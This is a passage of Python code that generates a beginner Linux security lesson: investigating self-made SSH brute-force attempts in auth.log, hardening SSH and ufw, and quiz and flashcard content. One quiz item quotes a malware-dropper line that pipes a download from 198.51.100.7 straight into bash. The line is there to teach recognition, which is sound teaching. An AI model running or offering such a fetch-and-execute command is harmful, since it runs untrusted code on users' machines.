    hi="Ab asli VM pe: files aur folders, find aur grep, text processing (tail -f live log), permissions, naya user aur sudo, apt updates, processes aur services, aur shell se networking. Har command ka output padho, wahi asli seekh hai."))

  S.append(dict(id="ssh-investigation", h="Mini investigation: catch an SSH brute force on your own VM", hi_h="Mini investigation: SSH brute force pakdo",
    body=f'''<p>Now you will attack your own VM in the gentlest possible way, a few wrong passwords from your own PC, and then investigate it like a SOC analyst.</p>
<ol>
<li><strong>Install and start SSH</strong> on the VM: <code>sudo apt install -y openssh-server</code>, then <code>systemctl status ssh</code>.</li>
<li><strong>Find the host-only address</strong>: <code>ip -br a</code>, usually something like <code>192.168.56.101</code>.</li>
<li><strong>From your own PC</strong> (Windows Terminal and macOS both include ssh), try a user that does not exist three times and type wrong passwords: <code>ssh fakeadmin@192.168.56.101</code>. Then log in properly once as your real user.</li>
<li><strong>Investigate</strong> on the VM:</li>
</ol>
{code(["$ sudo grep -E 'Failed password|Invalid user' /var/log/auth.log | tail", "$ sudo grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn", "$ sudo grep 'Accepted' /var/log/auth.log | tail -3", "$ journalctl -u ssh --since today | grep -i fail", "$ last -a | head", "$ lastb -a | head"], "SSH investigation")}
<p>Write a three line incident note: <em>what happened, from which IP, at what time, and whether any login succeeded</em>. That note is exactly what a level 1 SOC analyst writes many times a day.</p>
{attack("<p>Any server with SSH open to the internet sees password guessing within minutes of going live, mostly from automated botnets trying root, admin, oracle, test and similar names.</p>")}
{defend("<p>The next section fixes this for good with keys instead of passwords. Tools like <strong>fail2ban</strong> also block an IP after a few failures by reading exactly the log lines you just read.</p>")}''',
    hi="Apne PC se apne hi VM pe 3 galat password se SSH try karo, phir VM pe auth.log aur journalctl se investigate karo: kaunsa IP, kab, aur koi login successful hua ya nahi. Teen line ka incident note likho. SOC analyst roz yahi karta hai."))

  S.append(dict(id="harden", h="Harden your VM: a checklist you can reuse on real servers", hi_h="VM harden karo",
    body=f'''{code(["# 1. Patch", "$ sudo apt update && sudo apt upgrade -y", "# 2. Firewall: allow SSH only from your host-only network", "$ sudo ufw default deny incoming", "$ sudo ufw allow from 192.168.56.0/24 to any port 22 proto tcp", "$ sudo ufw enable && sudo ufw status verbose", "# 3. SSH keys: run this on YOUR PC, not the VM", "$ ssh-keygen -t ed25519", "$ ssh-copy-id youruser@192.168.56.101"], "Hardening part 1")}
<p>On Windows, if <code>ssh-copy-id</code> is missing, copy the contents of your <code>.pub</code> file into <code>~/.ssh/authorized_keys</code> on the VM. Confirm that key login works <strong>before</strong> the next step, or you will lock yourself out (restore your snapshot if you do).</p>
{code(["# 4. Turn off password and root login over SSH", "$ sudo nano /etc/ssh/sshd_config.d/10-hardening.conf", "# put these two lines in the file:", "PasswordAuthentication no", "PermitRootLogin no", "$ grep -ri passwordauthentication /etc/ssh/sshd_config.d/", "$ sudo sshd -t && sudo systemctl restart ssh"], "Hardening part 2")}
<p>The <code>grep</code> line matters: some images ship another file in <code>sshd_config.d</code> that sets <code>PasswordAuthentication yes</code>, and for each setting OpenSSH uses the <strong>first</strong> value it reads, with files in that folder read in name order. <code>sshd -t</code> checks the syntax before you restart. Now try <code>ssh fakeadmin@...</code> again: you should get <em>Permission denied (publickey)</em> without even a password prompt.</p>
{table(["Check", "Command", "Good result"], [
  ["Pending updates", "<code>apt list --upgradable</code>", "nothing listed"], ["Firewall", "<code>sudo ufw status</code>", "active, only port 22 from your lab subnet"],
  ["Listening services", "<code>sudo ss -tulnp</code>", "only what you expect"], ["UID 0 accounts", "<code>awk -F: '$3==0' /etc/passwd</code>", "root only"],
  ["SUID files", "<code>find / -perm -4000 -type f 2&gt;/dev/null</code>", "standard system tools only"], ["SSH password login", "<code>sudo sshd -T | grep -i passwordauth</code>", "passwordauthentication no"]],
  "Hardening checklist")}''',
    hi="Hardening: updates install karo, ufw firewall se SSH sirf lab network se allow karo, SSH keys (ed25519) use karo, phir password login aur root login band karo. Lock hone se pehle key login test karo. sshd -t se config check karke hi restart karo."))

  return dict(
    slug="learn-linux-hands-on-lab", stage=2, n="2.2", minutes=90, level="Beginner to intermediate",
    title="Linux Hands-On Lab", short="Browser shell missions, eight VM drills, an SSH brute force investigation and hardening.",
    seo_title="Linux Hands-On Lab for Cybersecurity: Shell Missions, SSH Logs, Hardening | CyberWithMadhav",
    desc="Free Linux lab: practise in a browser shell, build a VirtualBox Ubuntu VM, run 8 command drills, investigate an SSH brute force in auth.log and harden SSH and ufw.",
    kw="linux hands on lab, linux practice terminal online, virtualbox ubuntu lab setup, ssh brute force auth.log, linux hardening checklist, ufw ssh keys, linux commands practice",
    kicker="$ lesson 2.2 --stage linux --lab", hi_title="Linux hands-on lab",
    lead="Enough reading. Warm up in a safe browser shell with a real looking attack hidden in its logs, then build your own Ubuntu VM, drill the commands you will use every day, catch an SSH brute force you create yourself, and lock the machine down.",
    hi_lead="Padhai bahut hui. Pehle safe browser shell mein warm up karo, phir apna Ubuntu VM banao, roz ki commands practice karo, khud ka banaya SSH brute force pakdo, aur machine ko lock down karo.",
    goals=["Set up a safe Ubuntu lab VM with NAT and host-only networking and snapshots", "Complete nine shell missions covering files, permissions and log analysis", "Use find, grep, awk, sort and uniq to answer real investigation questions", "Investigate SSH failures in auth.log and journalctl and write an incident note", "Harden SSH and the firewall and verify the result"],
    sections=S,
    cards=[("NAT vs host-only?", "NAT gives the VM internet but hides it. Host-only connects the VM only to your own PC, with no internet."),
      ("Why take snapshots?", "To roll back in seconds after a mistake or a risky exercise."),
      ("Count lines matching a pattern?", "grep -c 'pattern' file, or grep 'pattern' file | wc -l"),
      ("Count occurrences of each value?", "sort | uniq -c | sort -rn"),
      ("Show failed logins history?", "sudo lastb, and grep 'Failed password' /var/log/auth.log"),
      ("Safest SSH authentication?", "Key based (for example ed25519) with PasswordAuthentication no and PermitRootLogin no."),
      ("Test sshd config before restart?", "sudo sshd -t"),
      ("Files changed in the last hour?", "find / -type f -mmin -60 2>/dev/null")],
    quiz=[("Which VirtualBox mode should a deliberately vulnerable VM avoid?", ["NAT", "Host-only", "Internal network", "Bridged"], 3, "Bridged puts the VM directly on your home or college network where others can reach it."),
      ("What does <code>sort | uniq -c | sort -rn</code> produce?", ["A random sample", "Each unique line with its count, most frequent first", "Only duplicate lines", "Lines in alphabetical order"], 1, "uniq needs sorted input; -c counts; sort -rn orders numerically, highest first."),
      ("You disabled SSH passwords but password logins still work. What should you check first?", ["The VM's RAM", "Other files in /etc/ssh/sshd_config.d that set PasswordAuthentication yes", "The browser cache", "The ufw logs"], 1, "OpenSSH uses the first value it reads, and drop in files can override yours."),
      ("Before turning off password login over SSH, you must:", ["Reboot the host", "Confirm that key based login works", "Delete /etc/passwd", "Disable the firewall"], 1, "Otherwise you can lock yourself out."),
      ("A file named <code>invoice_2026.pdf.sh</code> contains <code>curl -s http://198.51.100.7/x | bash</code>. What is it?", ["A PDF", "A script that downloads and runs code, typical of a malware dropper", "A log file", "A password hash"], 1, "Piping a download straight into bash runs whatever the server sends."),
      ("Which command lists only listening TCP and UDP ports with their programs?", ["sudo ss -tulnp", "ls -la", "chmod 755", "uname -a"], 0, "ss -t TCP, -u UDP, -l listening, -n numeric, -p process.")],
    lab=dict(title="Lab checklist: track your VM work", time="90 minutes in total",
      needs="VirtualBox, the Ubuntu 24.04 LTS ISO, and your own PC for the SSH steps. Tick each step as you finish it; progress stays in this browser.",
      steps=[("Build the VM", "<p>Create the VM with the settings in section 1: NAT on adapter 1, host-only on adapter 2. Install Ubuntu and all updates.</p>"),
        ("Snapshot: clean", "<p>Power off and take a snapshot named <code>clean</code>.</p>"),
        ("Finish the nine browser missions", "<p>Complete every mission in the practice shell above.</p>"),
        ("Complete the eight drills", "<p>Work through all eight drills on the VM and keep your notes.</p>"),
        ("Investigate the SSH failures", "<p>Generate failures from your PC, find them in the logs and write the three line incident note.</p>"),
        ("Harden and verify", "<p>Apply the hardening steps, then confirm every row of the checklist table shows the good result.</p>"),
        ("Snapshot: hardened", "<p>Take a second snapshot named <code>hardened</code>. This is your base for the next stages.</p>")],
      verify="You have a hardened Ubuntu VM with two snapshots, notes from eight drills, and an incident note about a brute force you detected yourself."),
    takeaways=["A real lab is isolated, owned by you and restorable with snapshots.",
      "grep, awk, sort and uniq answer most first questions in a Linux investigation.",
      "SSH open with passwords will be brute forced; logs show it clearly.",
      "Keys, no root login, a tight firewall and updates stop most of it.",
      "Write down what you find. Notes and incident reports are the job."])
